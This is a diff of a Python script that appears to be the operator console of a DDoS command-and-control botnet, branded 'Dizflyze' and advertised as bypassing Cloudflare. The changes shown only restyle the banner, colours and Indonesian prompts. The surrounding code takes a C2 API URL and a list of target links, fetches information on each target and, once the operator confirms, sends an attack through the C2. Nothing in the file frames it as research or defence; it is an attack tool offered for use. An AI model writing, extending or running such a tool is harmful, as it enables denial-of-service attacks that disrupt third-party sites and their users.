@@ -11,17 +11,17 @@ console = Console()
 def L():
     os.system('cls' if os.name == 'nt' else 'clear')
     console.print(Panel.fit("""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣧
-⠀⠀⠀⠀⠀⠀  ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze
-⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] DDOS
-⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
-⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 26 MEI 2025
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
+⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
+⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] C2 BotNet
+⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v1.3.2 
+⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 27 Jan
 ⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
 ⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
 ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-    """, style="bold magenta"))
+    """, style="bold white"))
 console.print(
     Panel.fit(
         "DDOS C2 BOTNET DIZ FLYZE ONLY BYPASS CLOUDFLARE",
@@ -71,26 +71,26 @@ async def attack_target(session, api_url, target):
 async def process_target(session, api_url, target):
     info = await fetch_info(session, target)
     if not info:
-        console.print(f"[red]Gagal mendapatkan info target: {target}[/red]")
+        console.print(f"[bold red]INFO GAGAL : {target}[/bold red]")
         return
-    table = Table(title=f"Info {target}")
+    table = Table(title=f"INFO TO ▶ {target}")
     table.add_column("Field", style="cyan")
-    table.add_column("Value", style="magenta")
+    table.add_column("Value", style="white")
     for k, v in info.items():
         table.add_row(str(k), str(v))
     console.print(table)
-    choice = console.input(f"Serang target {target}? (y/n): ")
+    choice = console.input(f"[bold white]▶ GAS? : ")
     if choice.lower() == 'y':
         success = await attack_target(session, api_url, target)
         if success:
-            console.print(f"[green]Serangan ke {target} berhasil![/green]")
+            console.print(f"[bold white]▶ [bold green]SUCCESS")
         else:
-            console.print(f"[red]Gagal serang {target}[/red]")
+            console.print(f"[bold white]▶[bold red] GAGAL ATTACK")
 
 async def main():
     L()
-    api_url = console.input("[white]API URL (ngrok): [/white]").strip()
-    targets_input = console.input("[white]Target(s) (pisahkan koma): [/white]").strip()
+    api_url = console.input("[bold white]╔═[ API C2 ]\n╚▶ ").strip()
+    targets_input = console.input("[bold white]╔═[ LINK ]\n╚▶ ").strip()
     targets = [NU(t.strip()) for t in targets_input.split(',')]
     async with aiohttp.ClientSession() as session:
         tasks = [process_target(session, api_url, t) for t in targets]
